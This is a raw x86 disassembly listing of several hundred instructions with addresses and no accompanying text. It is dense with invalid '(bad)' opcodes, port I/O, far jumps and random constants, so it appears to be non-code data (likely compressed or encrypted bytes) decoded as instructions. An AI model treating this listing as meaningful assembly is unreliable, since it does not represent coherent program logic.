  423689:	add    BYTE PTR [eax+0x59],bl
  42368c:	dec    ebx
  42368d:	push   ebp
  42368e:	dec    ebx
  42368f:	push   edi
  423690:	pop    esi
  423691:	pop    ebp
  423692:	mov    ebx,0x2ca42923
  423697:	out    0xf3,al
  423699:	dec    ecx
  42369a:	adc    al,ch
  42369c:	add    DWORD PTR [eax],eax
  42369e:	xchg   BYTE PTR [esi],al
  4236a0:	add    BYTE PTR [eax],al
  4236a2:	inc    eax
  4236a3:	pop    es
  4236a4:	enter  0x1634,0x4d
  4236a8:	outs   dx,BYTE PTR ds:[esi]
  4236a9:	gs or  eax,0x159f2744
  4236af:	hlt    
  4236b0:	adc    DWORD PTR [ecx-0x2d],edx
  4236b3:	mov    esp,0xef6f1814
  4236b8:	out    0x21,al
  4236ba:	test   al,0xdb
  4236bc:	imul   eax,DWORD PTR [ebx-0xa2f3166],0x8ccb9e45
  4236c6:	inc    eax
  4236c7:	nop    DWORD PTR [esi+0x45]
  4236cb:	gs inc esp
  4236cd:	xchg   ebp,eax
  4236ce:	(bad)  
  4236d0:	inc    eax
  4236d1:	pop    ecx
  4236d2:	mov    esi,DWORD PTR [esi-0x440d1b91]
  4236d8:	popf   
  4236d9:	mov    al,ds:0x437b27ce
  4236de:	add    DWORD PTR [edx+0x1a],0x89cb87b9
  4236e5:	mov    ch,0x6b
  4236e7:	cmp    eax,0xd1b1d5f8
  4236ec:	cdq    
  4236ed:	or     DWORD PTR [ebx],0xffffffa4
  4236f0:	inc    edx
  4236f1:	vmaxsd xmm4,xmm1,QWORD PTR [eax-0x49]
  4236f6:	mov    eax,ds:0x757577c2
  4236fb:	adc    ch,BYTE PTR [ebx-0xf3c597f]
  423701:	data16 or al,0xec
  423704:	push   eax
  423705:	in     eax,0xe9
  423707:	jb     0x423787
  423709:	cmp    al,0x13
  42370b:	sbb    DWORD PTR [edx],edx
  42370d:	loope  0x4236b7
  42370f:	ret    0x7383
  423712:	loop   0x42369a
  423714:	scas   eax,DWORD PTR es:[edi]
  423715:	aad    0x8e
  423717:	(bad)  
  423718:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423719:	jle    0x4236a7
  42371b:	xchg   edi,eax
  42371c:	xor    al,0x55
  42371e:	stc    
  42371f:	pop    ebx
  423720:	ss inc ecx
  423722:	les    edx,FWORD PTR ds:[ebx]
  423725:	pop    ecx
  423726:	inc    ecx
  423727:	lods   al,BYTE PTR ds:[esi]
  423728:	sbb    BYTE PTR [ebx-0x4d50620e],al
  42372e:	lods   eax,DWORD PTR ds:[esi]
  42372f:	push   0xf60ef9f1
  423734:	jmp    0x7ecd677f
  423739:	dec    esp
  42373a:	sub    bl,bl
  42373c:	pop    esp
  42373d:	stos   BYTE PTR es:[edi],al
  42373e:	or     ch,dl
  423740:	ins    BYTE PTR es:[edi],dx
  423741:	jg     0x42374a
  423743:	loop   0x423791
  423745:	lds    ebx,FWORD PTR [ecx-0x2e]
  423748:	add    bl,BYTE PTR [esi-0x6b]
  42374b:	jl     0x4237c7
  42374d:	xchg   edx,ebp
  42374f:	into   
  423750:	push   es
  423751:	or     eax,0x247ddcdf
  423756:	push   ebp
  423757:	call   0x5621:0xd31920a0
  42375e:	in     al,dx
  42375f:	icebp  
  423760:	and    eax,0x43652460
  423765:	add    eax,0xd9a705b0
  42376a:	ret    0x922a
  42376d:	mov    eax,ds:0xc790bae7
  423772:	imul   ecx,DWORD PTR [esi-0x2ddcb6d2],0xe4c9e571
  42377c:	add    esi,DWORD PTR [eax-0x7695a6d3]
  423782:	dec    ebx
  423783:	retf   
  423784:	fwait
  423785:	pop    edx
  423786:	(bad)  
  423787:	mov    al,0x92
  423789:	mov    WORD PTR [edi],fs
  42378b:	xchg   edi,eax
  42378c:	mov    ebx,esi
  42378e:	clc    
  42378f:	xchg   ebx,eax
  423790:	sbb    edx,DWORD PTR [eax+0x30]
  423793:	cwde   
  423794:	out    0xf0,eax
  423796:	or     BYTE PTR [eax],dl
  423798:	add    dh,BYTE PTR es:[edi]
  42379b:	pusha  
  42379c:	(bad)  
  42379d:	sbb    eax,DWORD PTR [esi+ebx*4-0x2d7ecff9]
  4237a4:	add    al,0x83
  4237a6:	xchg   ecx,eax
  4237a7:	and    al,0xce
  4237a9:	fcom   QWORD PTR [ebx+0x37152fb1]
  4237af:	jmp    0x3c79:0x8be28abd
  4237b6:	mov    eax,ds:0x8e08cc06
  4237bb:	or     eax,0x830ecc5d
  4237c0:	mov    ebp,0x4344246b
  4237c5:	add    eax,DWORD PTR [edx]
  4237c7:	mov    bh,0x66
  4237c9:	pop    ebp
  4237ca:	pusha  
  4237cb:	xchg   edi,eax
  4237cc:	bound  esi,QWORD PTR cs:[esi]
  4237cf:	fcom   DWORD PTR fs:[ecx-0x64]
  4237d3:	add    DWORD PTR [edx+0x23],0x59
  4237d7:	jb     0x423840
  4237d9:	mov    edx,0xdc387233
  4237de:	push   ebp
  4237df:	outs   dx,DWORD PTR ds:[esi]
  4237e0:	mov    esi,0x7b9fafcf
  4237e5:	xor    BYTE PTR [esi],cl
  4237e7:	fld    DWORD PTR [ecx+0x11]
  4237ea:	jge    0x423810
  4237ec:	pusha  
  4237ed:	cmp    dh,ah
  4237ef:	mov    dh,0x3d
  4237f1:	arpl   WORD PTR [edx+edi*4+0x50ffa57b],bx
  4237f8:	xor    ch,bl
  4237fa:	inc    esp
  4237fb:	dec    esi
  4237fc:	adc    bl,BYTE PTR [ecx+edi*1-0x53f25b46]
  423803:	lods   eax,DWORD PTR ds:[esi]
  423804:	mov    al,0x16
  423806:	aam    0xb1
  423808:	fld    DWORD PTR [ecx]
  42380a:	fucomp st(7)
  42380c:	imul   ecx,DWORD PTR [esi+0x11],0x3b
  423810:	jnp    0x423874
  423812:	cmc    
  423813:	int    0x65
  423815:	inc    ebp
  423816:	ret    
  423817:	enter  0x880d,0x38
  42381b:	push   ss
  42381c:	lock sar DWORD PTR [ebp+esi*4-0x107b43c2],1
  423824:	jp     0x4237b7
  423826:	cwde   
  423827:	xchg   ecx,eax
  423828:	jns    0x423860
  42382a:	push   esp
  42382b:	inc    esp
  42382c:	das    
  42382d:	cmp    ch,BYTE PTR [ebp+0x7e]
  423830:	dec    eax
  423831:	les    ebp,FWORD PTR [edi+0x20]
  423834:	cwde   
  423835:	mov    ebp,0x374ad243
  42383a:	out    0xb5,al
  42383c:	nop
  42383d:	pop    es
  42383e:	sub    dh,BYTE PTR [edi]
  423840:	jmp    0x5144:0xb61be832
  423847:	aaa    
  423848:	adc    eax,0x7afb8f9d
  42384d:	jp     0x423893
  42384f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423850:	popf   
  423851:	add    dl,BYTE PTR [ebx]
  423853:	cmp    DWORD PTR [edi+0x7b],eax
  423856:	cmp    eax,0x1d7ff4e7
  42385b:	sub    bh,dh
  42385d:	mov    al,ds:0x623cd0f
  423862:	in     al,dx
  423863:	push   esi
  423864:	pop    ss
  423865:	(bad)  
  423866:	mov    ch,0x4e
  423868:	or     BYTE PTR [esi+0x48],ah
  42386b:	mov    edi,0xd98d8be6
  423870:	mov    ah,0xba
  423872:	mov    ds,WORD PTR [edx+0x9]
  423875:	imul   esp,DWORD PTR [ebx+0x6146af4d],0x8c8b1521
  42387f:	cwde   
  423880:	hlt    
  423881:	ins    DWORD PTR es:[edi],dx
  423882:	xchg   edi,eax
  423883:	adc    ebx,DWORD PTR [ebx]
  423885:	or     bh,BYTE PTR [eax+eax*1]
  423888:	pop    es
  423889:	add    al,0x9
  42388b:	das    
  42388c:	pop    ecx
  42388d:	lock xchg DWORD PTR [ebp-0x7548f64b],ebp
  423894:	add    eax,0x97565fda
  423899:	ret    
  42389a:	inc    BYTE PTR [eax-0x7ae5a6dc]
  4238a0:	push   0xde712829
  4238a5:	mov    WORD PTR [edi+esi*1],fs
  4238a8:	inc    ecx
  4238a9:	movlps QWORD PTR [ecx+0x63c573],xmm1
  4238b0:	dec    edx
  4238b1:	sub    al,0x1
  4238b3:	mov    bl,0xb0
  4238b5:	popa   
  4238b6:	ins    DWORD PTR es:[edi],dx
  4238b7:	iret   
  4238b8:	cmp    eax,0xf6fc2713
  4238bd:	retf   
  4238be:	mov    ebp,0x9a14f530
  4238c3:	jae    0x423863
  4238c5:	mov    ch,BYTE PTR [ebp+0x182fd291]
  4238cb:	out    0xf8,eax
  4238cd:	inc    esi
  4238ce:	pop    ebp
  4238cf:	sbb    BYTE PTR [edx],bh
  4238d1:	loopne 0x42389c
  4238d3:	xor    al,0x23
  4238d5:	(bad)  
  4238d6:	idiv   DWORD PTR [edx+0x71087b26]
  4238dc:	mov    esp,0x7806a24
  4238e1:	add    BYTE PTR [ebx+0x69],bl
  4238e4:	adc    BYTE PTR ds:0xf285433f,al
  4238ea:	dec    eax
  4238eb:	jo     0x4238f7
  4238ed:	mov    ebx,0x21934e4c
  4238f2:	jle    0x423890
  4238f4:	dec    ebp
  4238f5:	in     al,dx
  4238f6:	pop    eax
  4238f7:	mov    ds:0xc5f43ece,al
  4238fc:	pop    eax
  4238fd:	(bad)  
  4238fe:	push   ebx
  4238ff:	sbb    BYTE PTR [ebp+0x65f37be1],al
  423905:	les    esi,FWORD PTR [esi]
  423907:	mov    cl,BYTE PTR [edi]
  423909:	mov    cl,dl
  42390b:	adc    DWORD PTR [ecx+edx*1+0x48028d8b],eax
  423912:	xchg   esi,eax
  423913:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423916:	shr    BYTE PTR [ebx],cl
  423918:	lahf   
  423919:	int3   
  42391a:	test   BYTE PTR [ebx],bl
  42391c:	xchg   BYTE PTR [eax+esi*2+0x2d],ch
  423920:	push   ebp
  423921:	dec    edi
  423922:	in     al,dx
  423923:	ss cld 
  423925:	jbe    0x42394c
  423927:	mov    al,cs:0x4cdd75fa
  42392d:	mov    ebp,0xf7c5e2d3
  423932:	inc    esi
  423933:	retf   
  423934:	pop    edi
  423935:	jbe    0x423911
  423937:	xchg   edi,eax
  423938:	shr    BYTE PTR [edi-0x46],0xac
  42393c:	xor    eax,0xbb7c3b7f
  423941:	and    DWORD PTR [edi-0x7f],eax
  423944:	inc    esp
  423945:	fwait
  423946:	std    
  423947:	aaa    
  423948:	cmp    eax,0xb7413533
  42394d:	fistp  QWORD PTR [eax]
  42394f:	jnp    0x423982
  423951:	or     bl,BYTE PTR [ebx-0x44]
  423954:	lods   eax,DWORD PTR ds:[esi]
  423955:	cmp    eax,0xa28befc2
  42395a:	jmp    DWORD PTR [edi]
  42395c:	sub    BYTE PTR [ebp+0x86db389],bh
  423962:	jnp    0x423902
  423964:	and    ch,dh
  423966:	push   0xabda08aa
  42396b:	das    
  42396c:	int    0xa3
  42396e:	gs pushf 
  423970:	in     eax,0x31
  423972:	jmp    0x4239cd
  423974:	daa    
  423975:	aad    0x42
  423977:	call   DWORD PTR [edi-0x6f9d39a4]
  42397d:	pop    ecx
  42397e:	aas    
  42397f:	xchg   esp,eax
  423980:	retf   0xea4f
  423983:	adc    ch,0xc3
  423986:	in     eax,0x42
  423988:	xor    al,0x2c
  42398a:	or     DWORD PTR [edx-0x76af9f72],ebp
  423990:	popf   
  423991:	xor    cl,BYTE PTR [edx+0x55]
  423994:	outs   dx,BYTE PTR ds:[esi]
  423995:	pop    ds
  423996:	test   ebp,0x7854183d
  42399c:	cmp    al,0x96
  42399e:	cmp    DWORD PTR [ebp+0x58],0x79c99062
  4239a5:	pusha  
  4239a6:	outs   dx,DWORD PTR ds:[esi]
  4239a7:	lahf   
  4239a8:	ror    BYTE PTR [ebx+0x4de07f49],1
  4239ae:	mov    esp,0x582acf2b
  4239b3:	dec    edi
  4239b4:	xor    eax,0x582e59dd
  4239b9:	loop   0x4239d2
  4239bb:	pop    esp
  4239bc:	pop    eax
  4239bd:	cdq    
  4239be:	into   
  4239bf:	jb     0x4239b7
  4239c1:	arpl   WORD PTR [ecx-0x2b325e90],cx
  4239c7:	fstp   TBYTE PTR [ebp-0x668074d4]
  4239cd:	cmp    esp,DWORD PTR [esi]
  4239cf:	aam    0x1
  4239d1:	pop    esp
  4239d2:	jl     0x4239cf
  4239d4:	sahf   
  4239d5:	(bad)  
  4239d6:	mov    esp,0x651c730f
  4239db:	xor    eax,0x8163f98a
  4239e0:	push   0x140e92d5
  4239e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239e6:	cmc    
  4239e7:	stos   BYTE PTR es:[edi],al
  4239e8:	push   cs
  4239e9:	in     eax,dx
  4239ea:	test   DWORD PTR ds:0x3209f6fe,ebp
  4239f0:	xchg   edx,eax
  4239f1:	xor    eax,eax
  4239f3:	dec    DWORD PTR [esi]
  4239f5:	cmp    dl,BYTE PTR [esi-0x4b559d8d]
  4239fb:	pop    es
  4239fc:	scas   eax,DWORD PTR es:[edi]
  4239fd:	ret    0x9305
  423a00:	or     DWORD PTR [esi],edx
  423a02:	mov    edx,0xfb082c46
  423a07:	push   ss
  423a08:	shr    BYTE PTR [eax-0x3aa9644],0xa2
  423a0f:	enter  0xb4d9,0xf2
  423a13:	(bad)  
  423a14:	adc    DWORD PTR [esi],edi
  423a16:	adc    al,0x8d
  423a18:	pop    ecx
  423a19:	mov    edx,0xbb94c5ec
  423a1e:	popf   
  423a1f:	cld    
  423a20:	mov    ebx,0x4abee859
  423a25:	jle    0x4239bf
  423a27:	mov    cl,0x88
  423a29:	les    ebp,FWORD PTR [esi]
  423a2b:	aam    0x59
  423a2d:	(bad)  
  423a2e:	popa   
  423a2f:	pop    ss
  423a30:	xor    dh,BYTE PTR [edx]
  423a32:	push   ebp
  423a33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a34:	stc    
  423a35:	fsub   DWORD PTR [ebp+0x1d]
  423a38:	loop   0x4239ef
  423a3a:	inc    esi
  423a3b:	adc    eax,0xf824a9fb
  423a40:	mov    ebp,0x6c8705b
  423a45:	std    
  423a46:	push   ebp
  423a47:	jbe    0x423a47
  423a49:	xchg   DWORD PTR [ebp+0x10],esp
  423a4c:	xor    BYTE PTR [ebx+0x19a7e35],al
  423a52:	cmp    al,0x9
  423a54:	popa   
  423a55:	imul   ecx,esi,0x6f
  423a58:	data16 jns 0x423a6b
  423a5b:	shl    BYTE PTR [esi+0x78480833],0xc9
  423a62:	pop    esi
  423a63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423a64:	stos   BYTE PTR es:[edi],al
  423a65:	add    BYTE PTR [ecx+0x1f47fd58],ah
  423a6b:	pop    ecx
  423a6c:	test   BYTE PTR [edx],ch
  423a6e:	mov    cl,0x3
  423a70:	dec    ecx
  423a71:	sahf   
  423a72:	inc    ebp
  423a73:	ins    BYTE PTR es:[edi],dx
  423a74:	push   ebp
  423a75:	sbb    al,0x22
  423a77:	push   esi
  423a78:	jno    0x423a10
  423a7a:	mov    ds:0xef3ac673,eax
  423a7f:	popa   
  423a80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a81:	fwait
  423a82:	sbb    eax,0x50d022d3
  423a87:	(bad)  
  423a89:	aaa    
  423a8a:	imul   ebp,DWORD PTR [ebp+0x20f70ad7],0xffffffa0
  423a91:	scas   al,BYTE PTR es:[edi]
  423a92:	shl    BYTE PTR [ebx+0x1fd17bca],0x90
  423a99:	mov    eax,0xeed5aab9
  423a9e:	inc    eax
  423a9f:	ds into 
  423aa1:	sbb    al,ah
  423aa3:	xor    DWORD PTR [esi+edx*4],0xa1497131
  423aaa:	lea    ecx,fs:[ebx-0x56]
  423aae:	pop    ebp
  423aaf:	fist   DWORD PTR [edi+eiz*8-0x59]
  423ab3:	xor    eax,0xf901cb58
  423ab8:	jns    0x423aa4
  423aba:	loop   0x423a6f
  423abc:	xchg   ecx,eax
  423abd:	lock (bad) 
  423abf:	mov    ecx,0x93ad7fd7
  423ac4:	cdq    
  423ac5:	fld    TBYTE PTR [ebx-0x3be2424a]
  423acb:	dec    eax
  423acc:	inc    ebx
  423acd:	inc    eax
  423ace:	ins    DWORD PTR es:[edi],dx
  423acf:	ja     0x423a5d
  423ad1:	lahf   
  423ad2:	(bad)  
  423ad3:	mov    BYTE PTR ds:[edx],cl
  423ad6:	pop    edx
  423ad7:	pop    es
  423ad8:	fmul   st(2),st
  423ada:	popf   
  423adb:	aam    0x56
  423add:	in     al,dx
  423ade:	push   ss
  423adf:	sbb    BYTE PTR [ebx],dl
  423ae1:	mov    ebp,0x28fe6d7e
  423ae6:	in     al,0xd2
  423ae8:	dec    ecx
  423ae9:	push   esi
  423aea:	mov    WORD PTR [eax-0x16],gs
  423aed:	test   DWORD PTR [eax-0x4f],edx
  423af0:	cwde   
  423af1:	jg     0x423b28
  423af3:	dec    edx
  423af4:	cmp    esi,edx
  423af6:	out    dx,al
  423af7:	cmp    al,0xc4
  423af9:	fcomi  st,st(6)
  423afb:	rcr    DWORD PTR [edi+0x25],1
  423afe:	(bad)  
  423aff:	inc    ebx
  423b00:	adc    eax,0x9c2074e8
  423b05:	into   
  423b06:	test   al,0x34
  423b08:	xlat   BYTE PTR ds:[ebx]
  423b09:	jge    0x423b1a
  423b0b:	ss shl cl,cl
  423b0e:	and    BYTE PTR [ecx-0x51ef8a69],0xca
  423b15:	and    esi,DWORD PTR [ebx+0x27b98cf1]
  423b1b:	loop   0x423b02
  423b1d:	add    eax,0xe8ab602
  423b22:	dec    esp
  423b23:	mov    bl,BYTE PTR [ebp+0x2de93aad]
  423b29:	cmp    DWORD PTR [edx+0x16],edx
  423b2c:	sahf   
  423b2d:	jo     0x423b86
  423b2f:	or     eax,DWORD PTR [edx]
  423b31:	add    ecx,DWORD PTR [edx+0x1cc33200]
  423b37:	ins    DWORD PTR es:[edi],dx
  423b38:	and    ecx,esi
  423b3a:	cmp    al,0xd5
  423b3c:	jecxz  0x423b56
  423b3e:	data16 sub al,0x70
  423b41:	imul   ebp,DWORD PTR [ecx+0x16e8fead],0x52d57096
  423b4b:	dec    ebp
  423b4c:	addr16 jnp 0x423b39
  423b4f:	sub    ecx,ebp
  423b51:	(bad)  
  423b52:	mov    ds:0x2e4e9300,eax
  423b57:	push   edx
  423b58:	inc    edi
  423b59:	ret    
  423b5a:	mov    ecx,0x334042d0
  423b5f:	xchg   ebx,esi
  423b61:	lock imul esp,DWORD PTR [ebx+0x1f249fb0],0x9847d96c
  423b6c:	or     BYTE PTR [ecx-0x12],bl
  423b6f:	jae    0x423bec
  423b71:	mov    bl,0x47
  423b73:	fmul   QWORD PTR [esi+0x59]
  423b76:	inc    ecx
  423b77:	jge    0x423afc
  423b79:	jmp    0xf15b86e8
  423b7e:	xchg   ecx,eax
  423b7f:	cli    
  423b80:	rcl    DWORD PTR [ebx+eiz*2-0x1ffbb145],cl
  423b87:	inc    DWORD PTR [ebp-0x474db486]
  423b8d:	cdq    
  423b8e:	sbb    eax,0x5aef75b
  423b93:	leave  
  423b94:	cmp    edx,ecx
  423b96:	adc    BYTE PTR ds:0xd09df2f3,al
  423b9c:	cdq    
  423b9d:	sar    BYTE PTR [ecx],cl
  423b9f:	inc    edx
  423ba0:	push   ebp
  423ba1:	and    bl,dl
  423ba3:	sub    al,0x5f
  423ba5:	xchg   al,al
  423ba7:	jnp    0x423b9c
  423ba9:	lods   al,BYTE PTR ds:[esi]
  423baa:	sub    al,0x4e
  423bac:	(bad)  
  423bad:	clc    
  423bae:	call   0x3c40:0x8d285e2a
  423bb5:	out    0xfa,eax
  423bb7:	ret    0xfc62
  423bba:	mov    fs,WORD PTR [edx-0x24e750d1]
  423bc0:	scas   eax,DWORD PTR es:[edi]
  423bc1:	sahf   
  423bc2:	mul    DWORD PTR [eax+0x5f]
  423bc5:	mov    ds:0x91c7a665,al
  423bca:	xor    eax,0x56b13b8e
  423bcf:	iret   
  423bd0:	mov    eax,0x89dd99f0
  423bd5:	mov    cl,ah
  423bd7:	mov    ds:0x23ae3a58,eax
  423bdc:	jb     0x423bea
  423bde:	data16 (bad) 
  423be1:	pop    ebx
  423be2:	sahf   
  423be3:	sub    al,0xb9
  423be5:	xchg   BYTE PTR [edx],ah
  423be7:	sti    
  423be8:	fdiv   DWORD PTR [edx]
  423bea:	dec    esi
  423beb:	or     BYTE PTR [esi+0x42],0x6f
  423bef:	js     0x423c5d
  423bf1:	sbb    eax,0xa25e58ec
  423bf6:	mov    ch,0x60
  423bf8:	mov    dh,0x3
  423bfa:	sbb    eax,0xd59acf41
  423bff:	jecxz  0x423be9
  423c01:	push   es
  423c02:	outs   dx,DWORD PTR ds:[esi]
  423c03:	retf   0x9960
  423c06:	cmp    edi,DWORD PTR [edx-0x3e]
  423c09:	shl    BYTE PTR [edi+0x27837262],cl
  423c0f:	pop    edx
  423c10:	xchg   edi,eax
  423c11:	call   0x26c7d9ab
  423c16:	idiv   DWORD PTR ds:0x286bd0a3
  423c1c:	jae    0x423bb3
  423c1e:	xchg   edi,eax
  423c1f:	into   
  423c20:	push   0x7c
  423c22:	and    BYTE PTR [eax],bl
  423c24:	mov    esi,0x300c4dd5
  423c29:	and    eax,DWORD PTR [eax]
  423c2b:	(bad)  
  423c2c:	ds inc edi
  423c2e:	or     BYTE PTR [ebp+ecx*4+0x54],ch
  423c32:	aas    
  423c33:	add    BYTE PTR [edi],dh
  423c35:	sbb    esi,DWORD PTR [eax]
  423c37:	sub    BYTE PTR [edx+0x2092900b],al
  423c3d:	mov    ch,0xf2
  423c3f:	inc    esp
  423c40:	loope  0x423c93
  423c42:	test   BYTE PTR [ebp+0x1e8c8bed],dh
  423c48:	jbe    0x423bd1
  423c4a:	mov    esp,0xa35ddb4b
  423c4f:	dec    ecx
  423c50:	mov    eax,ds:0x728d0737
  423c55:	pusha  
  423c56:	jne    0x423c94
  423c58:	(bad)  
  423c59:	pop    ecx
  423c5a:	mov    ch,0x4a
  423c5c:	cmp    al,0x52
  423c5e:	popf   
  423c5f:	mov    cl,0x71
  423c61:	fs aas 
  423c63:	xchg   BYTE PTR [ecx+0x59],dl
  423c66:	lds    ecx,FWORD PTR [edi-0x7c]
  423c69:	sti    
  423c6a:	ja     0x423c78
  423c6c:	mov    cl,0x77
  423c6e:	loop   0x423c5e
  423c70:	cmp    esp,ecx
  423c72:	xor    DWORD PTR [ebx+0x52014ae2],edi
  423c78:	iret   
  423c79:	mov    dl,BYTE PTR [ecx]
  423c7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423c7c:	dec    esi
  423c7d:	stos   BYTE PTR es:[edi],al
  423c7e:	pusha  
  423c7f:	and    edx,DWORD PTR [esi-0x537015d0]
  423c85:	and    DWORD PTR [eax+0xd],esi
  423c88:	and    eax,0x69a5b1f9
  423c8d:	retf   
  423c8e:	xchg   esi,eax
  423c8f:	add    dh,BYTE PTR [ebx]
  423c91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423c92:	jmp    0xca8a6e23
  423c97:	mov    eax,0xe9599c41
  423c9c:	push   ds
  423c9d:	mov    edx,0xedabda5
  423ca2:	xchg   edx,eax
  423ca3:	(bad)  
  423ca4:	test   eax,0x5202fea4
  423ca9:	dec    esp
  423caa:	hlt    
  423cab:	sub    eax,DWORD PTR [ebx-0xecb3954]
  423cb1:	sub    al,0x7c
  423cb3:	mov    esi,0x926e6a1e
  423cb8:	cmp    eax,0x6894c315
  423cbd:	cld    
  423cbe:	inc    edi
  423cbf:	jmp    0x748b:0xa237da1a
  423cc6:	(bad)
  423cc9:	in     eax,0xb0
  423ccb:	mov    bl,0x3b
  423ccd:	add    al,0x9
  423ccf:	ds ins DWORD PTR es:[edi],dx
  423cd1:	mov    bh,0x55
  423cd3:	mov    edi,0x46256b97
  423cd8:	pop    ds
  423cd9:	ror    cl,cl
  423cdb:	xor    al,0xcd
  423cdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423cde:	sbb    al,0xc6
  423ce0:	and    BYTE PTR [edi],al
  423ce2:	pop    ds
  423ce3:	inc    ecx
  423ce4:	aam    0xc6
  423ce6:	push   edi
  423ce7:	xor    bh,BYTE PTR [edx+0x41]
  423cea:	lock ret 
  423cec:	sub    BYTE PTR [edx],cl
  423cee:	push   ss
  423cef:	pusha  
  423cf0:	xchg   esp,eax
  423cf1:	sbb    BYTE PTR [edx+0x38670443],dl
  423cf7:	mov    ds:0xe1676964,al
  423cfc:	add    al,cl
  423cfe:	call   0xa97bdf31
  423d03:	cli    
  423d04:	mov    bl,0x20
  423d06:	adc    eax,esi
  423d08:	ins    BYTE PTR es:[edi],dx
  423d09:	xchg   ebx,eax
  423d0a:	sub    eax,0x24b7ab2a
  423d0f:	aaa    
  423d10:	iret   
  423d11:	jae    0x423d2e
  423d13:	xor    BYTE PTR [ebx],ch
  423d15:	sub    eax,0x834b8d22
  423d1a:	mov    dh,0x1d
  423d1c:	add    esp,ebp
  423d1e:	sub    eax,0x9c7fba5a
  423d23:	int    0xf9
  423d25:	gs or  al,0x64
  423d28:	add    BYTE PTR [eax],al
  423d2a:	inc    esp
  423d2b:	push   edx
  423d2c:	push   edi
  423d2d:	push   ebp
  423d2e:	push   edi
  423d2f:	push   ebp
  423d30:	inc    esi
  423d31:	push   ebx
  423d32:	test   BYTE PTR [eax+0x3565fe6e],ah
  423d38:	pop    es
  423d39:	stc    
  423d3a:	cwde   
  423d3b:	retf   
  423d3c:	add    DWORD PTR [eax],eax
  423d3e:	xchg   BYTE PTR [esi],al
  423d40:	add    BYTE PTR [eax],al
  423d42:	test   al,0x73
  423d44:	cld    
  423d45:	push   ecx
  423d46:	pop    ecx
  423d47:	adc    DWORD PTR [esi+0x54],0xffffffa8
  423d4b:	pop    edx
  423d4c:	xor    esi,DWORD PTR [edx-0x566831ae]
  423d52:	inc    esi
  423d53:	mov    al,ds:0x3d68c853
  423d59:	loop   0x423d68
  423d5b:	test   BYTE PTR [esi],al
  423d5d:	push   0x963a962f
  423d62:	retf   
  423d63:	adc    al,BYTE PTR [esi-0x40efd73e]
  423d69:	inc    esi
  423d6a:	xor    BYTE PTR [esi+0x7ada2b94],cl
  423d70:	retf   
  423d71:	adc    edx,DWORD PTR [edi+0x3a]
  423d74:	xchg   edx,eax
  423d75:	int    0xef
  423d77:	dec    esi
  423d78:	sub    al,0x6f
  423d7a:	pop    ss
  423d7b:	xchg   ecx,ecx
  423d7d:	add    al,BYTE PTR [ecx+0x11]
  423d80:	in     eax,0xec
  423d82:	pop    edi
  423d83:	stc    
  423d84:	or     BYTE PTR [edx-0x55],al
  423d87:	std    
  423d88:	ja     0x423d18
  423d8a:	pop    esi
  423d8b:	in     al,0x14
  423d8d:	jmp    0xb205:0xf6595754
  423d94:	jo     0x423d23
  423d96:	and    eax,0x58c8b5f9
  423d9b:	xor    al,0x8d
  423d9d:	aas    
  423d9e:	sbb    eax,0x830845fe
  423da3:	dec    edx
  423da4:	popf   
  423da5:	rol    DWORD PTR [ecx],1
  423da7:	push   ds
  423da8:	pushw  ds
  423daa:	xor    DWORD PTR [ecx+0xc],ebp
  423dad:	loope  0x423d94
  423daf:	lods   al,BYTE PTR ds:[esi]
  423db0:	push   eax
  423db1:	mov    edx,0x32ed54c1
  423db6:	lods   al,BYTE PTR ds:[esi]
  423db7:	(bad)  
  423db8:	sub    ecx,DWORD PTR [ebp+0x20]
  423dbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423dbc:	mov    al,ds:0x301f0c74
  423dc1:	cld    
  423dc2:	int3   
  423dc3:	xor    cl,BYTE PTR [ebp-0x3fd05fec]
  423dc9:	das    
  423dca:	das    
  423dcb:	or     ah,al
  423dcd:	iret   
  423dce:	(bad)  
  423dcf:	dec    esi
  423dd0:	jo     0x423def
  423dd2:	(bad)  
  423dd3:	test   eax,0x45172ef2
  423dd8:	fstp   QWORD PTR [ebx+0x2d]
  423ddb:	adc    al,0x1b
  423ddd:	jecxz  0x423d93
  423ddf:	outs   dx,DWORD PTR ds:[esi]
  423de0:	push   esi
  423de1:	adc    DWORD PTR [edx+0x39ab808f],0xe1e8978
  423deb:	or     esp,DWORD PTR [esi-0x30]
  423dee:	cmp    bl,BYTE PTR [ebx-0x1]
  423df1:	mov    edx,0x2645a4a0
  423df6:	lock leave 
  423df8:	inc    ecx
  423df9:	int    0x97
  423dfb:	sbb    DWORD PTR [ecx+eiz*1+0x67],esp
  423dff:	push   ebx
  423e00:	mov    al,ds:0xffb17f23
  423e05:	out    dx,eax
  423e06:	ja     0x423e58
  423e08:	retf   0xc384
  423e0b:	sbb    eax,0x500ca711
  423e10:	pusha  
  423e11:	in     eax,0xf4
  423e13:	ret    0x6f42
  423e16:	adc    DWORD PTR [eax-0x4bb2668],0xffffffd6
  423e1d:	gs stos BYTE PTR es:[edi],al
  423e1f:	(bad)  
  423e20:	and    BYTE PTR [ebx+0x201b001c],dl
  423e26:	cmp    BYTE PTR [eax+ebp*4+0x7c595e9d],ah
  423e2d:	sahf   
  423e2e:	push   0x34
  423e30:	jp     0x423e27
  423e32:	stos   DWORD PTR es:[edi],eax
  423e33:	or     al,0xb9
  423e35:	ret    
  423e36:	int    0xd
  423e38:	aad    0x46
  423e3a:	repz (bad) 
  423e3c:	fstp   TBYTE PTR [edx+0x5]
  423e3f:	mov    ebp,0xc0ea1a7c
  423e44:	jo     0x423e95
  423e46:	lods   al,BYTE PTR ds:[esi]
  423e47:	mov    es,WORD PTR [ebp-0x17be1422]
  423e4d:	ret    0xa93b
  423e50:	mov    bh,0x7a
  423e52:	xchg   edi,eax
  423e53:	sti    
  423e54:	xchg   esp,eax
  423e55:	pusha  
  423e56:	sub    BYTE PTR [eax+0x66d2c62a],0x45
  423e5d:	in     eax,dx
  423e5e:	leave  
  423e5f:	repz neg BYTE PTR [edx]
  423e62:	lds    edi,FWORD PTR [ebx-0x28e30f47]
